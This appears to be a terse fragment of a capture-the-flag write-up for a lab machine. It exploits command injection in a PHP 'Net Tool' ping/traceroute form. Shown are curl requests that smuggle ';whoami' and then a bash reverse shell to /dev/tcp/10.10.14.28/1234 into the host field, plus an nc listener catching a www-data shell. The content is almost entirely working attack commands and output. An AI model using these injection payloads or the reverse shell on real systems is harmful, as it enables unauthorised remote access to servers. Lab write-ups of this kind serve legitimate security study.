welcome.php allows pinging an ip
```html
$ curl -b "PHPSESSID=svit50b2v8t4ldlm9b5s7hpj22" --data "command=traceroute&host=8.8.8.8;whoami"
<html">
   
   <head>
      <title>Net Tool v0.1 </title>
   </head>
   
   <body>
	<h1>Net Tool v0.1</h1>
	<form method="POST" action="">
	<select name="command">
		<option value="traceroute">traceroute</option>
		<option value="ping -c 1">ping</option>
	</select>
	<input type="text" name="host" value="8.8.8.8"/>
	<input type="submit" value="Execute!"/>
	</form>
			uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
		      <p><a href = "logout.php">Sign Out</a></p>
   </body>
   
</html>
```
so
```bash
$ curl -b "PHPSESSID=svit50b2v8t4ldlm9b5s7hpj22" --data "command=traceroute&host=8.8.8.8;bash -i \>& /dev/tcp/10.10.14.28/1234 0>&1"
```
and 
```bash
$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:41796.
bash: cannot set terminal process group (1379): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ 